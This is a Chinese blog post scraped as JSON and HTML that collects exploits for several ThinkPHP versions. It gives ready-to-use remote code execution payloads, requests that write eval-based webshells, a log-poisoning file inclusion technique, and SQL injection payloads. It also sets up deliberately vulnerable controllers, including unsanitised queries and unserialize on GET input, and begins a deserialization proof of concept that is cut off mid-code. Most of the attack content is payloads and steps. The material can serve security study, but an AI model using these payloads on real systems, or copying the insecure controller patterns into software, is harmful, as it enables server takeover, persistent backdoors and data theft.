{"blogid": "124580131", "writerAge": "码龄2年", "writerBlogNum": "10", "writerCollect": "21", "writerComment": "7", "writerFan": "1", "writerGrade": "2级", "writerIntegral": "122", "writerName": "LeYuuuuuuu", "writerProfileAdress": "writer_image\\profile_124580131.jpg", "writerRankTotal": "89321", "writerRankWeekly": "690429", "writerThumb": "8", "writerVisitNum": "8173", "blog_read_count": "4802", "blog_time": "已于 2022-05-07 16:24:47 修改", "blog_title": "ThinkPHP漏洞大全", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"tp5payload_0\"></a>tp5payload大全</h1>\n<p><a href=\"https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection\">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p>\n<h1><a id=\"tp5_2\"></a>tp5参考文献</h1>\n<p><a href=\"https://blog.csdn.net/weixin_40709439/article/details/86564457\">https://blog.csdn.net/weixin_40709439/article/details/86564457</a></p>\n<h1><a id=\"tp_4\"></a>tp版本发现</h1>\n<p><strong>1.使用错误的路径</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\319603a097714f26a1a5cc25e7526dbf.png\"/></p>\n<p><strong>2.采用错误的参数</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\34abeeae9c314acd9cf606da4e041a67.png\"/></p>\n<h1><a id=\"150x5023_11\"></a>1.版本5.0.x&lt;5.0.23</h1>\n<h2><a id=\"10__50x5023RCEpayload_12\"></a>1.0 5.0.x-5.0.23通杀RCE-payload</h2>\n<pre><code># 第一个\nhttp://127.0.0.1/cms/thinkPHP5/thinkphp_5.0.0/public/?s=captcha&amp;test=whoami\nPOST   _method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami\n\n# 第二个\n?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami\n</code></pre>\n<h2><a id=\"10_50x5023GetShellEpayload_21\"></a>1.0 5.0.x-5.0.23通杀GetShellE-payload</h2>\n<pre><code>?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=12345.php&amp;vars[1][1]=&lt;?php @eval($_POST[shell]); ?&gt;\n</code></pre>\n<h2><a id=\"11system_25\"></a>1.1利用system()函数</h2>\n<pre><code>http://192.168.18.143/thinkphp_5.0.10/public/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami\n</code></pre>\n<p><img alt=\"image.png\" src=\"image\\066b5367cca7ccfa498d21e3f8cc4e6f.png#clientId=ue3306ec7-213d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=299&amp;id=uf07502e2&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/><br/> 参数system可以换成其他函数例如phpinfo也就是说<br/> &amp;vars[0]=system&amp;vars[1][]=whoami system为php内置函数,可以执行系统命令<br/> 那么vars[1][]=后面的值 就为函数的实参</p>\n<h2><a id=\"12shell_34\"></a>1.2写入shell</h2>\n<p>test.php为写入的文件名,vars[1][]=写入的内容</p>\n<pre><code> ?s=/index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=test.php&amp;vars[1][]=&lt;?php%20@eval($_POST[%22xxx%22])?&gt;\n</code></pre>\n<p>要在public目录下添加该paylaod,写入路径也是到public目录内</p>\n<h2><a id=\"_40\"></a></h2>\n<h1><a id=\"25023_43\"></a>2.版本5.0.23</h1>\n<h2><a id=\"21_44\"></a>2.1命令执行</h2>\n<p>在public路径下Get传参s=captcha<br/> POST传参_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami<br/> <img alt=\"image.png\" src=\"image\\a94fe284cf8d4f5e0cb5f2527b9b189e.png#clientId=ue3306ec7-213d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=645&amp;id=u84cc8ac3&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/></p>\n<h2><a id=\"22_48\"></a>2.2写入木马</h2>\n<p>在public路径下Get传参s=captcha<br/> POST传参<br/> _method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=echo \"&lt;?php @eval($_GET['tp5023'])?&gt; \" &gt; a.php<br/> <img alt=\"image.png\" src=\"image\\388028efa361c2f4f1a6262ebaef7e32.png#clientId=uf2526997-4617-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=723&amp;id=ufd6c7d39&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/><br/> <img alt=\"image.png\" src=\"image\\fc2ff2350869e3c4fffc1510fc6a270a.png#clientId=uf2526997-4617-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=564&amp;id=uce6dcde2&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/></p>\n<h1><a id=\"351x5131_54\"></a>3.版本5.1.x&lt;5.1.31</h1>\n<p><strong>弹出phpinfo的命令</strong></p>\n<pre><code>?s=index/\\think\\Request/input&amp;filter=phpinfo&amp;data=1\n?s=index/think\\request/input?data[]=phpinfo()&amp;filter=assert\n    \n?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\n</code></pre>\n<p><strong>命令执行</strong></p>\n<pre><code>?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami\n?s=index/think\\request/input?data[]=system('whoami')&amp;filter=assert\n?s=index/\\think\\Request/input&amp;filter=system&amp;data=whoami\n</code></pre>\n<h1><a id=\"42x3031RCE_68\"></a>4.版本2.x、3.0-3.1-RCE</h1>\n<h2><a id=\"40_69\"></a>4.0参考文献</h2>\n<p><a href=\"https://www.cnblogs.com/cute-puli/p/14656631.html\">https://www.cnblogs.com/cute-puli/p/14656631.html</a></p>\n<h2><a id=\"41_71\"></a>4.1使用条件</h2>\n<p><strong>(1)php版本&lt;=5.6.29</strong><br/> <strong>(2)使用了preg_replace函数，且使用了/e的命令可执行模式；</strong></p>\n<h2><a id=\"42_74\"></a>4.2漏洞发现</h2>\n<p>通过报错页面发现thinkphp的版本号<br/> <img alt=\"在这里插入图片描述\" src=\"image\\247dfaf6d51a423cb4ccd59b9f9b65e1.png\"/></p>\n<p>获取PHP版本号<br/> <img alt=\"在这里插入图片描述\" src=\"image\\eed163be406b492daa268fee3102cac9.png\"/></p>\n<h2><a id=\"43_81\"></a>4.3漏洞利用</h2>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>s<span class=\"token operator\">=</span><span class=\"token operator\">/</span>index<span class=\"token operator\">/</span>index<span class=\"token operator\">/</span>xxx<span class=\"token operator\">/</span><span class=\"token variable\">$</span><span class=\"token punctuation\">{<!-- --></span>@<span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n<span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>a<span class=\"token operator\">/</span>b<span class=\"token operator\">/</span>c<span class=\"token operator\">/</span><span class=\"token variable\">$</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n<span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>a<span class=\"token operator\">/</span>b<span class=\"token operator\">/</span>c<span class=\"token operator\">/</span><span class=\"token variable\">$</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token operator\">/</span>c<span class=\"token operator\">/</span>d<span class=\"token operator\">/</span>e<span class=\"token operator\">/</span>f\n<span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>a<span class=\"token operator\">/</span>b<span class=\"token operator\">/</span>c<span class=\"token operator\">/</span>d<span class=\"token operator\">/</span>e<span class=\"token operator\">/</span><span class=\"token variable\">$</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n<span class=\"token operator\">...</span><span class=\"token operator\">...</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\357c9b75ddca48c8a2ad3bb41519251d.png\"/></p>\n<p>传码(注意$_POST[]这个内的连接密码不为字符,只能为数字)</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>s<span class=\"token operator\">=</span><span class=\"token operator\">/</span>Index<span class=\"token operator\">/</span>index<span class=\"token operator\">/</span>xxx<span class=\"token operator\">/</span><span class=\"token variable\">$</span><span class=\"token punctuation\">{<!-- --></span>@<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n</code></pre>\n<p><img alt=\"image.png\" src=\"image\\13575fc9aedfb8ce3443261aecf11572.png#clientId=ua50f8177-98ea-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=538&amp;id=uef9fb59b&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/><br/> <img alt=\"image.png\" src=\"image\\feae05e32939653720327ab175b08255.png#clientId=ua50f8177-98ea-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=497&amp;id=u260191b0&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/></p>\n<h1><a id=\"532xRCE_97\"></a>5.版本3.2.x-RCE</h1>\n<h2><a id=\"50_98\"></a>5.0参考文献</h2>\n<p><a href=\"https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ\">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a><br/> <a href=\"https://blog.csdn.net/A1bewhy/article/details/123676942?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=Vulfocus%20thinkphp&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-123676942.142%5Ev5%5Earticle_score_rank,157%5Ev4%5Econtrol&amp;spm=1018.2226.3001.4187\">https://blog.csdn.net/A1bewhy/article/details/123676942?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=Vulfocus%20thinkphp&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<sub>all</sub>sobaiduweb~default-1-123676942.142<sup>v5</sup>article_score_rank,157<sup>v4</sup>control&amp;spm=1018.2226.3001.4187</a></p>\n<h2><a id=\"51_101\"></a>5.1漏洞利用</h2>\n<p><strong>方式一:</strong><br/> 访问</p>\n<pre><code class=\"prism language-php\">index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>m<span class=\"token operator\">=</span><span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n  或者\n  <span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>m<span class=\"token operator\">=</span>Home<span class=\"token operator\">&amp;</span>c<span class=\"token operator\">=</span>Index<span class=\"token operator\">&amp;</span>a<span class=\"token operator\">=</span>index<span class=\"token operator\">&amp;</span>test<span class=\"token operator\">=</span><span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>我第一次发包<br/> <img alt=\"在这里插入图片描述\" src=\"image\\7c7001cba33f4d7f978136fde1aa02b0.png\"/></p>\n<p>(是从浏览器拦截的,发现被浏览器进行了url编码,当时没在意,但是后来发现日志存的是 %3E%3C?=phpinfo();?%3E ,并没解析)</p>\n<p>接着我手动改一下<img alt=\"在这里插入图片描述\" src=\"image\\fce47b60e2494b029d0011c3c5e66fdd.png\"/></p>\n<p>然后访问22_04_03.log文件</p>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>m<span class=\"token operator\">=</span>Home<span class=\"token operator\">&amp;</span>c<span class=\"token operator\">=</span>Index<span class=\"token operator\">&amp;</span>a<span class=\"token operator\">=</span>index<span class=\"token operator\">&amp;</span>value<span class=\"token punctuation\">[</span>_filename<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span>Application<span class=\"token operator\">/</span>Runtime<span class=\"token operator\">/</span>Logs<span class=\"token operator\">/</span>Common<span class=\"token operator\">/</span><span class=\"token number\">22_04_03.</span>log  \n</code></pre>\n<p><img alt=\"image.png\" src=\"image\\13ab8482fc99a08bef4a8e47a1e0e2b7.png#clientId=uad48aef1-62ab-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=585&amp;id=uebf0f58c&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/></p>\n<p><strong>今后对日志文件进行传恶意代码时,一定要从burp进行url解码之后,在发给服务器.这样才能避免传入的代码为url码的形式.从而造成无法解析代码</strong></p>\n<h1><a id=\"6323SQL_124\"></a>6.版本3.2.3之SQL注入</h1>\n<h2><a id=\"60_125\"></a>6.0参考文献</h2>\n<p><a href=\"https://y4er.com/post/thinkphp3-vuln/\">https://y4er.com/post/thinkphp3-vuln/</a></p>\n<h2><a id=\"61I_127\"></a>6.1使用I()函数的漏洞发现+利用</h2>\n<p>先介绍一下thinkphp3的路由格式</p>\n<pre><code class=\"prism language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//php.local/thinkphp3.2.3/index.php/Home/Index/index/id/1</span>\n                                模块<span class=\"token operator\">/</span>控制器<span class=\"token operator\">/</span>方法<span class=\"token operator\">/</span>参数\n</code></pre>\n<p>还可以这样</p>\n<pre><code class=\"prism language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//php.local/thinkphp3.2.3/index.php?s=Home/Index/index/id/1</span>\n</code></pre>\n<p>接下来咱们要从<strong>参数</strong>这个部分下手</p>\n<p>--------------------[环境搭建]-------------------------------------<br/> 首先搭载一下环境<br/> 链接：<a href=\"https://pan.baidu.com/s/1LczEr3T4iMMYeZMuDwpj5A\">https://pan.baidu.com/s/1LczEr3T4iMMYeZMuDwpj5A</a><br/> 提取码：9999</p>\n<p>配置一下数据库thinkphp3.2.3\\ThinkPHP\\Conf\\convention.php<br/> <img alt=\"image.png\" src=\"image\\6a04c9b325a57381d1cfae298e24a36c.png#clientId=u74dd81df-abe6-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=490&amp;id=ub8ace0d5&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/><br/> 然后创建个库,表,再添加点数据<br/> <img alt=\"image.png\" src=\"image\\97d437e6212881f2adf7fbf2f141b27c.png#clientId=u74dd81df-abe6-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=730&amp;id=ua4a11ca9&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/><br/> 然后为参数添加个查询</p>\n<p>Application/Home/Controller/IndexController.class.php<br/> <img alt=\"image.png\" src=\"image\\721f1f7aa55bf10be6c204f4bd42a6e8.png#clientId=u74dd81df-abe6-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=634&amp;id=u9717643d&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">Home<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">Think<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">IndexController</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Controller</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;style type=\"text/css\"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: \"微软雅黑\"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover,{color:blue;}&lt;/style&gt;&lt;div style=\"padding: 24px 48px;\"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=\"text/javascript\" src=\"http://ad.topthink.com/Public/static/client.js\"&gt;&lt;/script&gt;&lt;thinkad id=\"ad_55e75dfae343f5a1\"&gt;&lt;/thinkad&gt;&lt;script type=\"text/javascript\" src=\"http://tajs.qq.com/stats?sId=9347272\" charset=\"UTF-8\"&gt;&lt;/script&gt;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token function\">M</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'GET.id'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token punctuation\">}</span>\n\t\n<span class=\"token punctuation\">}</span>\n\n</code></pre>\n<p>okk<br/> --------------------------[环境搭建结束]-------------------------------------------------<br/> 访问<br/> <a href=\"http://127.0.0.1/thinkphp3.2.3/?id=1\">http://127.0.0.1/thinkphp3.2.3/?id=1</a><br/> <img alt=\"image.png\" src=\"image\\c2908ea322ebeb7b482c6b1b71033583.png#clientId=u74dd81df-abe6-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=565&amp;id=u0916e2a3&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/><br/> <strong>Payload:</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">/</span><span class=\"token operator\">?</span>id<span class=\"token punctuation\">[</span>where<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token keyword\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token function\">updatexml</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>select <span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p><img alt=\"image.png\" src=\"image\\b9d11b6ba70374f61d3b3f16936ce3a9.png#clientId=u74dd81df-abe6-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=514&amp;id=u530f593b&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/></p>\n<h2><a id=\"62_178\"></a>6.2使用全局数组传参的漏洞发现+利用</h2>\n<p>首先修改<br/> Application/Home/Controller/IndexController.class.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">Home<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">Think<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">IndexController</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Controller</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;style type=\"text/css\"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: \"微软雅黑\"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover,{color:blue;}&lt;/style&gt;&lt;div style=\"padding: 24px 48px;\"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=\"text/javascript\" src=\"http://ad.topthink.com/Public/static/client.js\"&gt;&lt;/script&gt;&lt;thinkad id=\"ad_55e75dfae343f5a1\"&gt;&lt;/thinkad&gt;&lt;script type=\"text/javascript\" src=\"http://tajs.qq.com/stats?sId=9347272\" charset=\"UTF-8\"&gt;&lt;/script&gt;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//$data = M('test')-&gt;find(I('GET.id'));</span>\n\t<span class=\"token comment\">//var_dump($data);</span>\n\t\n\t\n\t <span class=\"token variable\">$User</span> <span class=\"token operator\">=</span> <span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$map</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'username'</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// $map = array('username' =&gt; I('username'));</span>\n    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$User</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">where</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$map</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token punctuation\">}</span>\n\t\n<span class=\"token punctuation\">}</span>\n\n</code></pre>\n<p>首先访问<a href=\"http://127.0.0.1/thinkphp3.2.3/index.php?username=admin\">http://127.0.0.1/thinkphp3.2.3/index.php?username=admin</a><br/> <img alt=\"image.png\" src=\"image\\d1e929d41ba25dc75aedc94c35800b3e.png#clientId=u74dd81df-abe6-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=444&amp;id=u6147c5bb&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/><br/> <strong>Payload:</strong></p>\n<pre><code class=\"prism language-php\">index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>username<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>exp<span class=\"token operator\">&amp;</span>username<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token operator\">%</span><span class=\"token number\">20</span>and<span class=\"token operator\">%</span><span class=\"token number\">20</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>select <span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p><img alt=\"image.png\" src=\"image\\8a3f8058b75b72dfe8a682fd7c60dd00.png#clientId=u74dd81df-abe6-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=612&amp;id=u8ab5b5f2&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/></p>\n<h1><a id=\"7thinkphp5024RCE_210\"></a>7.版本thinkphp5.0.24反序列化RCE</h1>\n<h2><a id=\"70_211\"></a>7.0参考文献</h2>\n<p><a href=\"https://www.cnblogs.com/xiaozhiru/p/12452528.html\">https://www.cnblogs.com/xiaozhiru/p/12452528.html</a></p>\n<h2><a id=\"71_213\"></a>7.1漏洞环境搭建</h2>\n<p>链接：<a href=\"https://pan.baidu.com/s/1mM_EmnInM3PS3YDGSukp0w\">https://pan.baidu.com/s/1mM_EmnInM3PS3YDGSukp0w</a><br/> 提取码：9999</p>\n<p>下载并解压好之后我们需要构造一个漏洞环境<br/> 这里我们在Index.php中添加<br/> <img alt=\"image.png\" src=\"image\\deb37734d5fbcf857c5949bc4a0e489a.png#clientId=u2132471c-559c-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=284&amp;id=u1a5992fe&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/></p>\n<pre><code>&lt;?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index()\n    {\n        echo \"Welcome thinkphp 5.0.24\";\n        unserialize(base64_decode($_GET['a']));\n    }\n}\n</code></pre>\n<p>(覆盖源文件即可)</p>\n<p><img alt=\"image.png\" src=\"image\\e82814e7dacf4910af48854e5ff5ee97.png#clientId=u2132471c-559c-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=34&amp;id=ua7539ed6&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/><br/> 这里咱们构造的漏洞环境就是从GET传值中a参数经base64解码之后,再进行反序列操作<br/> ,这就很明显了,只要使用thinkPHP5.0.24开发的,并且使用啦反序列化函数,咱们就有可能传入恶意参数</p>\n<h2><a id=\"72_238\"></a>7.2漏洞复现</h2>\n<p>直接上POC(Linuex Windows均可以)</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Windows</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span 